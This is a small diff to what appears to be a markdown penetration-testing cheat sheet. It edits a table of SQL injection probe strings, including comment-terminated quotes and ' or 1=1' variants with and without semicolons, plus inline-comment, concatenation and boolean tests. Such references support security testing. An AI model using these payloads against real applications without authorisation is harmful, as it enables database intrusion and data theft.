@@ -155,7 +155,8 @@ Navigate to that location using LFI.
 *Try the following to see if it provides valid results for text that was interpreted:*
 
 Commenting out the end | <code> Dent' ;# <br> Dent' ;-- <br> Dent' ;-- - </code>
-Commenting out the end | <code> Dent' or 1=1;# <br> Dent' or 1=1;-- <br> Dent' or 1=1 ;-- - </code>
+Commenting with semicolon | <code> Dent' or 1=1; # <br> Dent' or 1=1;-- <br> Dent' or 1=1;-- - </code>
+Commenting without semicolon | <code> Dent' or 1=1 # <br> Dent' or 1=1-- <br> Dent' or 1=1-- - </code>
 Inline Commenting | <code> De'/* */'nt </code>
 Concatenation | <code> De''nt <br> De'||'nt </code>
 Binary/Boolean | <code> Dent' and 1;# <br> Dent' and 1=1;# <br> Dent' and 0;# <br> Dent' and 1=0;# </code>
